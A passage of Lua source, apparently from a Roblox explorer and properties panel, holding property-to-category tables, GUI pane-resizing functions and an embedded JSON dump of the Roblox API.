        ["SecondaryColor"] = "Data",
        ["Size"] = "Data"
    },
    ["Smoke"] = {
        ["Color"] = "Data",
        ["Enabled"] = "Data",
        ["Opacity"] = "Data",
        ["RiseVelocity"] = "Data",
        ["Size"] = "Data"
    },
    ["ParticleEmitter"] = {
        ["Acceleration"] = "Motion",
        ["Color"] = "Appearance",
        ["Drag"] = "Particles",
        ["EmissionDirection"] = "Emission",
        ["Enabled"] = "Emission",
        ["Lifetime"] = "Emission",
        ["LightEmission"] = "Appearance",
        ["LockedToPart"] = "Particles",
        ["Rate"] = "Emission",
        ["RotSpeed"] = "Emission",
        ["Rotation"] = "Emission",
        ["Size"] = "Appearance",
        ["Speed"] = "Emission",
        ["Texture"] = "Appearance",
        ["Transparency"] = "Appearance",
        ["VelocityInheritance"] = "Particles",
        ["VelocitySpread"] = "Emission",
        ["ZOffset"] = "Appearance"
    },
    ["Sky"] = {
        ["CelestialBodiesShown"] = "Appearance",
        ["SkyboxBk"] = "Appearance",
        ["SkyboxDn"] = "Appearance",
        ["SkyboxFt"] = "Appearance",
        ["SkyboxLf"] = "Appearance",
        ["SkyboxRt"] = "Appearance",
        ["SkyboxUp"] = "Appearance",
        ["StarCount"] = "Appearance"
    },
    ["Stats"] = {
        ["MinReportInterval"] = "Reporting",
        ["ReporterType"] = "Reporting"
    },
    ["StarterPlayer"] = {
        ["AutoJumpEnabled"] = "Mobile",
        ["CameraMaxZoomDistance"] = "Camera",
        ["CameraMinZoomDistance"] = "Camera",
        ["CameraMode"] = "Camera",
        ["DevCameraOcclusionMode"] = "Camera",
        ["DevComputerCameraMovementMode"] = "Camera",
        ["DevComputerMovementMode"] = "Controls",
        ["DevTouchCameraMovementMode"] = "Camera",
        ["DevTouchMovementMode"] = "Controls",
        ["EnableMouseLockOption"] = "Controls",
        ["HealthDisplayDistance"] = "Data",
        ["LoadCharacterAppearance"] = "Character",
        ["NameDisplayDistance"] = "Data",
        ["ScreenOrientation"] = "Mobile"
    },
    ["Lighting"] = {
        ["Ambient"] = "Appearance",
        ["Brightness"] = "Appearance",
        ["ColorShift_Bottom"] = "Appearance",
        ["ColorShift_Top"] = "Appearance",
        ["FogColor"] = "Fog",
        ["FogEnd"] = "Fog",
        ["FogStart"] = "Fog",
        ["GeographicLatitude"] = "Data",
        ["GlobalShadows"] = "Appearance",
        ["OutdoorAmbient"] = "Appearance",
        ["Outlines"] = "Appearance",
        ["TimeOfDay"] = "Data"
    },
    ["LocalizationService"] = {
        ["LocaleId"] = "Behavior",
        ["PreferredLanguage"] = "Behavior"
    },
    ["Light"] = {
        ["Brightness"] = "Appearance",
        ["Color"] = "Appearance",
        ["Enabled"] = "Appearance",
        ["Shadows"] = "Appearance"
    },
    ["PointLight"] = {
        ["Range"] = "Appearance"
    },
    ["SpotLight"] = {
        ["Angle"] = "Appearance",
        ["Face"] = "Appearance",
        ["Range"] = "Appearance"
    },
    ["SurfaceLight"] = {
        ["Angle"] = "Appearance",
        ["Face"] = "Appearance",
        ["Range"] = "Appearance"
    },
    ["TrussPart"] = {
        ["Style"] = "Part"
    },
    ["Attachment"] = {
        ["Axis"] = "Derived Data",
        ["CFrame"] = "Data",
        ["Position"] = "Data",
        ["Rotation"] = "Data",
        ["SecondaryAxis"] = "Derived Data",
        ["Visible"] = "Appearance",
        ["WorldAxis"] = "Derived Data",
        ["WorldPosition"] = "Derived Data",
        ["WorldRotation"] = "Derived Data",
        ["WorldSecondaryAxis"] = "Derived Data"
    },
    ["Humanoid"] = {
        ["AutoJumpEnabled"] = "Control",
        ["AutoRotate"] = "Control",
        ["CameraMaxDistance"] = "Data",
        ["CameraMinDistance"] = "Data",
        ["CameraMode"] = "Data",
        ["CameraOffset"] = "Data",
        ["DisplayDistanceType"] = "Data",
        ["Health"] = "Game",
        ["HealthDisplayDistance"] = "Data",
        ["Health_XML"] = "Game",
        ["HipHeight"] = "Game",
        ["Jump"] = "Control",
        ["JumpPower"] = "Game",
        ["JumpReplicate"] = "Control",
        ["LeftLeg"] = "Data",
        ["MaxHealth"] = "Game",
        ["MaxSlopeAngle"] = "Game",
        ["MoveDirection"] = "Control",
        ["MoveDirectionInternal"] = "Control",
        ["NameDisplayDistance"] = "Data",
        ["NameOcclusion"] = "Data",
        ["PlatformStand"] = "Control",
        ["RigType"] = "Data",
        ["RightLeg"] = "Data",
        ["SeatPart"] = "Control",
        ["Sit"] = "Control",
        ["Strafe"] = "Control",
        ["TargetPoint"] = "Control",
        ["Torso"] = "Data",
        ["WalkAngleError"] = "Control",
        ["WalkDirection"] = "Control",
        ["WalkSpeed"] = "Game",
        ["WalkToPart"] = "Control",
        ["WalkToPoint"] = "Control"
    }
}

local categoryOrder = {["Appearance"] = 1,["Data"] = 2,["Goals"] = 3,["Thrust"] = 4,["Turn"] = 5,["Camera"] = 6,["Behavior"] = 7,["Compliance"] = 8,["AlignOrientation"] = 9,["AlignPosition"] = 10,["Derived"] = 11,["LineForce"] = 12,["Rod"] = 13,["Constraint"] = 14,["Spring"] = 15,["Torque"] = 16,["VectorForce"] = 17,["Attachments"] = 18,["Axes"] = 19,["Image"] = 20,["Text"] = 21,["Scrolling"] = 22,["State"] = 23,["Control"] = 24,["Game"] = 25,["Fog"] = 26,["Settings"] = 27,["Physics"] = 28,["Teams"] = 29,["Forcefield"] = 30,["Part"] = 31,["Surface Inputs"] = 32,["Surface"] = 33,["Motion"] = 34,["Particles"] = 35,["Emission"] = 36,["Reflection"] = 37,["Mobile"] = 38,["Controls"] = 39,["Character"] = 40,["Results"] = 41,["Other"] = 42}

-- Gui Functions
local function getResource(name)
	return resources:WaitForChild(name):Clone()
end

function f.prevProportions(t,ind)
	local count = 0	
	for i = ind,1,-1 do
		count = count + t[i].Proportion
	end
	return count
end

function f.buildPanes()
	--print("\n-----\n")
	--for i,v in pairs(RPaneItems) do print(v.Window) end
	--print("\n-----")
	
	for i,v in pairs(RPaneItems) do
		v.Window:TweenSizeAndPosition(UDim2.new(0,explorerSettings.RPaneWidth,v.Proportion,0),UDim2.new(0,0,f.prevProportions(RPaneItems,i-1),0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
		--v.Window.Position = UDim2.new(0,0,prevProportions(RPaneItems,i-1),0)
		--v.Window.Size = UDim2.new(0,explorerSettings.RPaneWidth,v.Proportion,0)
	end
end

function f.distance(x1,y1,x2,y2)
	return math.sqrt((x2-x1)^2+(y2-y1)^2)
end

function f.checkMouseInGui(gui)
	if gui == nil then return false end
	local guiPosition = gui.AbsolutePosition
	local guiSize = gui.AbsoluteSize	
	
	if mouse.X >= guiPosition.x and mouse.X <= guiPosition.x + guiSize.x and mouse.Y >= guiPosition.y and mouse.Y <= guiPosition.y + guiSize.y then
		return true
	else
		return false
	end
end

function f.addToPane(window,pane)
	if pane == "Right" then
		for i,v in pairs(RPaneItems) do if v.Window == window then return end end
		for i,v in pairs(RPaneItems) do
			RPaneItems[i].Proportion = v.Proportion / 100 * 80
		end
		window.Parent = contentR
		if #RPaneItems == 0 then
			table.insert(RPaneItems,{Window = window, Proportion = 1})
		else
			table.insert(RPaneItems,{Window = window, Proportion = 0.2})
		end
	end
	f.buildPanes()
end

function f.removeFromPane(window)
	local pane
	local windowIndex
	
	for i,v in pairs(LPaneItems) do if v.Window == window then pane = LPaneItems windowIndex = i end end
	for i,v in pairs(RPaneItems) do if v.Window == window then pane = RPaneItems windowIndex = i end end	
	
	if pane and #pane > 0 then
		local weightTop,weightBottom,weightTopN,weightBottomN = 0,0			
		
		for i = windowIndex-1,1,-1 do weightTop = weightTop + RPaneItems[i].Proportion end	
		for i = windowIndex+1,#RPaneItems do weightBottom = weightBottom + RPaneItems[i].Proportion end	
		
		if weightTop > 0 and weightBottom == 0 then
			weightTopN = weightTop + RPaneItems[windowIndex].Proportion
		elseif weightTop == 0 and weightBottom > 0 then
			weightBottomN = weightBottom + RPaneItems[windowIndex].Proportion
		else
			weightTopN = weightTop + RPaneItems[windowIndex].Proportion/2
			weightBottomN = weightBottom + RPaneItems[windowIndex].Proportion/2
		end
			
		for i = 1,windowIndex-1 do
			RPaneItems[i].Proportion = RPaneItems[i].Proportion / weightTop * weightTopN
		end
		for i = windowIndex+1,#RPaneItems do
			RPaneItems[i].Proportion = RPaneItems[i].Proportion / weightBottom * weightBottomN
		end

		table.remove(RPaneItems,windowIndex)
		f.buildPanes()
	end
end

function f.resizePaneItem(window,pane,size)
	local windowIndex = 0
	local sizeWeight = 0
	size = math.max(0.2,size)
	if pane == "Right" then
		for i,v in pairs(RPaneItems) do
			if v.Window == window then windowIndex = i break end
		end
			
		for i = windowIndex+1,#RPaneItems do
			sizeWeight = sizeWeight + RPaneItems[i].Proportion
		end
		
		local oldSize = 1-(sizeWeight+RPaneItems[windowIndex].Proportion)
		
		RPaneItems[windowIndex].Proportion = size
		
		for i = 1,windowIndex-1 do
			RPaneItems[i].Proportion = RPaneItems[i].Proportion / oldSize * (1-(sizeWeight+size))
		end
		
		for i,v in pairs(RPaneItems) do
			print(v.Window, v.Proportion)
		end
	end
	f.buildPanes()
end

f.fetchAPI = function()
    local classes,enums,rawAPI = {},{},nil
    if script and script:FindFirstChild("API") then
        rawAPI = require(script.API)
    else
        rawAPI = [==[[{"Superclass":null,"type":"Class","Name":"Instance","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"Archivable","tags":[],"Class":"Instance"},{"ValueType":"string","type":"Property","Name":"ClassName","tags":["readonly"],"Class":"Instance"},{"ValueType":"int","type":"Property","Name":"DataCost","tags":["LocalUserSecurity","readonly"],"Class":"Instance"},{"ValueType":"string","type":"Property","Name":"Name","tags":[],"Class":"Instance"},{"ValueType":"Object","type":"Property","Name":"Parent","tags":[],"Class":"Instance"},{"ValueType":"bool","type":"Property","Name":"RobloxLocked","tags":["PluginSecurity"],"Class":"Instance"},{"ValueType":"bool","type":"Property","Name":"archivable","tags":["deprecated","hidden"],"Class":"Instance"},{"ValueType":"string","type":"Property","Name":"className","tags":["deprecated","readonly"],"Class":"Instance"},{"ReturnType":"void","Arguments":[],"Name":"ClearAllChildren","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"Clone","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Destroy","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"FindFirstAncestor","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"FindFirstAncestorOfClass","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"FindFirstAncestorWhichIsA","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"bool","Name":"recursive","Default":"false"}],"Name":"FindFirstChild","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"FindFirstChildOfClass","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"className","Default":null},{"Type":"bool","Name":"recursive","Default":"false"}],"Name":"FindFirstChildWhichIsA","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetChildren","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"scopeLength","Default":"4"}],"Name":"GetDebugId","tags":["PluginSecurity","notbrowsable"],"Class":"Instance","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetDescendants","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetFullName","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"EventInstance","Arguments":[{"Type":"string","Name":"property","Default":null}],"Name":"GetPropertyChangedSignal","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"IsA","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"descendant","Default":null}],"Name":"IsAncestorOf","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"ancestor","Default":null}],"Name":"IsDescendantOf","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Remove","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"childName","Default":null},{"Type":"double","Name":"timeOut","Default":null}],"Name":"WaitForChild","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"children","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"clone","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"destroy","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"bool","Name":"recursive","Default":"false"}],"Name":"findFirstChild","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"getChildren","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"isA","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"ancestor","Default":null}],"Name":"isDescendantOf","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"remove","tags":["deprecated"],"Class":"Instance","type":"Function"},{"Arguments":[{"Name":"child","Type":"Instance"},{"Name":"parent","Type":"Instance"}],"Name":"AncestryChanged","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"property","Type":"Property"}],"Name":"Changed","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"child","Type":"Instance"}],"Name":"ChildAdded","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"child","Type":"Instance"}],"Name":"ChildRemoved","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"descendant","Type":"Instance"}],"Name":"DescendantAdded","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"descendant","Type":"Instance"}],"Name":"DescendantRemoving","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"child","Type":"Instance"}],"Name":"childAdded","tags":["deprecated"],"Class":"Instance","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Accoutrement","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"AttachmentForward","tags":[],"Class":"Accoutrement"},{"ValueType":"CoordinateFrame","type":"Property","Name":"AttachmentPoint","tags":[],"Class":"Accoutrement"},{"ValueType":"Vector3","type":"Property","Name":"AttachmentPos","tags":[],"Class":"Accoutrement"},{"ValueType":"Vector3","type":"Property","Name":"AttachmentRight","tags":[],"Class":"Accoutrement"},{"ValueType":"Vector3","type":"Property","Name":"AttachmentUp","tags":[],"Class":"Accoutrement"},{"Superclass":"Accoutrement","type":"Class","Name":"Accessory","tags":[]},{"Superclass":"Accoutrement","type":"Class","Name":"Hat","tags":["deprecated"]},{"Superclass":"Instance","type":"Class","Name":"AdService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[],"Name":"ShowVideoAd","tags":["deprecated"],"Class":"AdService","type":"Function"},{"Arguments":[{"Name":"adShown","Type":"bool"}],"Name":"VideoAdClosed","tags":["deprecated"],"Class":"AdService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"AdvancedDragger","tags":[]},{"Superclass":"Instance","type":"Class","Name":"AnalyticsService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"counterName","Default":null},{"Type":"int","Name":"amount","Default":"1"}],"Name":"ReportCounter","tags":["RobloxScriptSecurity"],"Class":"AnalyticsService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"seriesName","Default":null},{"Type":"Dictionary","Name":"points","Default":null},{"Type":"int","Name":"throttlingPercentage","Default":null}],"Name":"ReportInfluxSeries","tags":["RobloxScriptSecurity"],"Class":"AnalyticsService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"category","Default":null},{"Type":"float","Name":"value","Default":null}],"Name":"ReportStats","tags":["RobloxScriptSecurity"],"Class":"AnalyticsService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"target","Default":null},{"Type":"string","Name":"eventContext","Default":null},{"Type":"string","Name":"eventName","Default":null},{"Type":"Dictionary","Name":"additionalArgs","Default":null}],"Name":"SetRBXEvent","tags":["RobloxScriptSecurity"],"Class":"AnalyticsService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"target","Default":null},{"Type":"string","Name":"eventContext","Default":null},{"Type":"string","Name":"eventName","Default":null},{"Type":"Dictionary","Name":"additionalArgs","Default":null}],"Name":"SetRBXEventStream","tags":["RobloxScriptSecurity"],"Class":"AnalyticsService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"category","Default":null},{"Type":"string","Name":"action","Default":null},{"Type":"string","Name":"label","Default":null}],"Name":"TrackEvent","tags":["RobloxScriptSecurity"],"Class":"AnalyticsService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Dictionary","Name":"args","Default":null}],"Name":"UpdateHeartbeatObject","tags":["RobloxScriptSecurity"],"Class":"AnalyticsService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Animation","tags":[]},{"ValueType":"Content","type":"Property","Name":"AnimationId","tags":[],"Class":"Animation"},{"Superclass":"Instance","type":"Class","Name":"AnimationController","tags":[]},{"ReturnType":"Array","Arguments":[],"Name":"GetPlayingAnimationTracks","tags":[],"Class":"AnimationController","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"animation","Default":null}],"Name":"LoadAnimation","tags":[],"Class":"AnimationController","type":"Function"},{"Arguments":[{"Name":"animationTrack","Type":"Instance"}],"Name":"AnimationPlayed","tags":[],"Class":"AnimationController","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"AnimationTrack","tags":[]},{"ValueType":"Object","type":"Property","Name":"Animation","tags":["readonly"],"Class":"AnimationTrack"},{"ValueType":"bool","type":"Property","Name":"IsPlaying","tags":["readonly"],"Class":"AnimationTrack"},{"ValueType":"float","type":"Property","Name":"Length","tags":["readonly"],"Class":"AnimationTrack"},{"ValueType":"bool","type":"Property","Name":"Looped","tags":[],"Class":"AnimationTrack"},{"ValueType":"AnimationPriority","type":"Property","Name":"Priority","tags":[],"Class":"AnimationTrack"},{"ValueType":"float","type":"Property","Name":"Speed","tags":["readonly"],"Class":"AnimationTrack"},{"ValueType":"float","type":"Property","Name":"TimePosition","tags":[],"Class":"AnimationTrack"},{"ValueType":"float","type":"Property","Name":"WeightCurrent","tags":["readonly"],"Class":"AnimationTrack"},{"ValueType":"float","type":"Property","Name":"WeightTarget","tags":["readonly"],"Class":"AnimationTrack"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"speed","Default":"1"}],"Name":"AdjustSpeed","tags":[],"Class":"AnimationTrack","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"weight","Default":"1"},{"Type":"float","Name":"fadeTime","Default":"0.100000001"}],"Name":"AdjustWeight","tags":[],"Class":"AnimationTrack","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"keyframeName","Default":null}],"Name":"GetTimeOfKeyframe","tags":[],"Class":"AnimationTrack","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"fadeTime","Default":"0.100000001"},{"Type":"float","Name":"weight","Default":"1"},{"Type":"float","Name":"speed","Default":"1"}],"Name":"Play","tags":[],"Class":"AnimationTrack","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"fadeTime","Default":"0.100000001"}],"Name":"Stop","tags":[],"Class":"AnimationTrack","type":"Function"},{"Arguments":[],"Name":"DidLoop","tags":[],"Class":"AnimationTrack","type":"Event"},{"Arguments":[{"Name":"keyframeName","Type":"string"}],"Name":"KeyframeReached","tags":[],"Class":"AnimationTrack","type":"Event"},{"Arguments":[],"Name":"Stopped","tags":[],"Class":"AnimationTrack","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Animator","tags":[]},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"animation","Default":null}],"Name":"LoadAnimation","tags":[],"Class":"Animator","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"deltaTime","Default":null}],"Name":"StepAnimations","tags":["PluginSecurity"],"Class":"Animator","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"AssetService","tags":[]},{"ReturnType":"int","Arguments":[{"Type":"string","Name":"placeName","Default":null},{"Type":"int64","Name":"templatePlaceID","Default":null},{"Type":"string","Name":"description","Default":""}],"Name":"CreatePlaceAsync","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"string","Name":"placeName","Default":null},{"Type":"int64","Name":"templatePlaceID","Default":null},{"Type":"string","Name":"description","Default":""}],"Name":"CreatePlaceInPlayerInventoryAsync","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"int64","Name":"packageAssetId","Default":null}],"Name":"GetAssetIdsForPackage","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"Tuple","Arguments":[{"Type":"int64","Name":"assetId","Default":null},{"Type":"Vector2","Name":"thumbnailSize","Default":null},{"Type":"int","Name":"assetType","Default":"0"}],"Name":"GetAssetThumbnailAsync","tags":["RobloxScriptSecurity"],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"Dictionary","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"int","Name":"pageNum","Default":"1"}],"Name":"GetAssetVersions","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"creationID","Default":null}],"Name":"GetCreatorAssetID","tags":["deprecated"],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[],"Name":"GetGamePlacesAsync","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"Dictionary","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"GetPlacePermissions","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"int","Name":"versionNumber","Default":null}],"Name":"RevertAsset","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"void","Arguments":[],"Name":"SavePlaceAsync","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"AccessType","Name":"accessType","Default":"Everyone"},{"Type":"Array","Name":"inviteList","Default":"{}"}],"Name":"SetPlacePermissions","tags":[],"Class":"AssetService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"Attachment","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Axis","tags":[],"Class":"Attachment"},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"Orientation","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"Rotation","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"SecondaryAxis","tags":[],"Class":"Attachment"},{"ValueType":"bool","type":"Property","Name":"Visible","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldAxis","tags":["readonly"],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldOrientation","tags":["readonly"],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldPosition","tags":["readonly"],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldRotation","tags":["deprecated","readonly"],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldSecondaryAxis","tags":["readonly"],"Class":"Attachment"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetAxis","tags":[],"Class":"Attachment","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetSecondaryAxis","tags":[],"Class":"Attachment","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"axis","Default":null}],"Name":"SetAxis","tags":[],"Class":"Attachment","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"axis","Default":null}],"Name":"SetSecondaryAxis","tags":[],"Class":"Attachment","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"BadgeService","tags":["notCreatable"]},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"badgeId","Default":null}],"Name":"AwardBadge","tags":[],"Class":"BadgeService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"badgeId","Default":null}],"Name":"IsDisabled","tags":[],"Class":"BadgeService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"badgeId","Default":null}],"Name":"IsLegal","tags":[],"Class":"BadgeService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"badgeId","Default":null}],"Name":"UserHasBadge","tags":[],"Class":"BadgeService","type":"YieldFunction"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"userId","Type":"int"},{"Name":"badgeId","Type":"int"}],"Name":"BadgeAwarded","tags":["RobloxScriptSecurity"],"Class":"BadgeService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BasePlayerGui","tags":[]},{"Superclass":"BasePlayerGui","type":"Class","Name":"CoreGui","tags":["notCreatable"]},{"ValueType":"Object","type":"Property","Name":"SelectionImageObject","tags":["RobloxScriptSecurity"],"Class":"CoreGui"},{"ValueType":"int","type":"Property","Name":"Version","tags":["readonly"],"Class":"CoreGui"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enabled","Default":null},{"Type":"Instance","Name":"guiAdornee","Default":null},{"Type":"NormalId","Name":"faceId","Default":null}],"Name":"SetUserGuiRendering","tags":["RobloxScriptSecurity"],"Class":"CoreGui","type":"Function"},{"Superclass":"BasePlayerGui","type":"Class","Name":"PlayerGui","tags":["notCreatable"]},{"ValueType":"ScreenOrientation","type":"Property","Name":"CurrentScreenOrientation","tags":["readonly"],"Class":"PlayerGui"},{"ValueType":"ScreenOrientation","type":"Property","Name":"ScreenOrientation","tags":[],"Class":"PlayerGui"},{"ValueType":"Object","type":"Property","Name":"SelectionImageObject","tags":[],"Class":"PlayerGui"},{"ReturnType":"float","Arguments":[],"Name":"GetTopbarTransparency","tags":[],"Class":"PlayerGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"transparency","Default":null}],"Name":"SetTopbarTransparency","tags":[],"Class":"PlayerGui","type":"Function"},{"Arguments":[{"Name":"transparency","Type":"float"}],"Name":"TopbarTransparencyChangedSignal","tags":[],"Class":"PlayerGui","type":"Event"},{"Superclass":"BasePlayerGui","type":"Class","Name":"StarterGui","tags":[]},{"ValueType":"bool","type":"Property","Name":"ResetPlayerGuiOnSpawn","tags":["deprecated"],"Class":"StarterGui"},{"ValueType":"ScreenOrientation","type":"Property","Name":"ScreenOrientation","tags":[],"Class":"StarterGui"},{"ValueType":"bool","type":"Property","Name":"ShowDevelopmentGui","tags":[],"Class":"StarterGui"},{"ReturnType":"bool","Arguments":[{"Type":"CoreGuiType","Name":"coreGuiType","Default":null}],"Name":"GetCoreGuiEnabled","tags":[],"Class":"StarterGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"parameterName","Default":null},{"Type":"Function","Name":"getFunction","Default":null}],"Name":"RegisterGetCore","tags":["RobloxScriptSecurity"],"Class":"StarterGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"parameterName","Default":null},{"Type":"Function","Name":"setFunction","Default":null}],"Name":"RegisterSetCore","tags":["RobloxScriptSecurity"],"Class":"StarterGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"parameterName","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetCore","tags":[],"Class":"StarterGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CoreGuiType","Name":"coreGuiType","Default":null},{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetCoreGuiEnabled","tags":[],"Class":"StarterGui","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"parameterName","Default":null}],"Name":"GetCore","tags":[],"Class":"StarterGui","type":"YieldFunction"},{"Arguments":[{"Name":"coreGuiType","Type":"CoreGuiType"},{"Name":"enabled","Type":"bool"}],"Name":"CoreGuiChangedSignal","tags":["RobloxScriptSecurity"],"Class":"StarterGui","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Beam","tags":[]},{"ValueType":"Object","type":"Property","Name":"Attachment0","tags":[],"Class":"Beam"},{"ValueType":"Object","type":"Property","Name":"Attachment1","tags":[],"Class":"Beam"},{"ValueType":"ColorSequence","type":"Property","Name":"Color","tags":[],"Class":"Beam"},{"ValueType":"float","type":"Property","Name":"CurveSize0","tags":[],"Class":"Beam"},{"ValueType":"float","type":"Property","Name":"CurveSize1","tags":[],"Class":"Beam"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Beam"},{"ValueType":"bool","type":"Property","Name":"F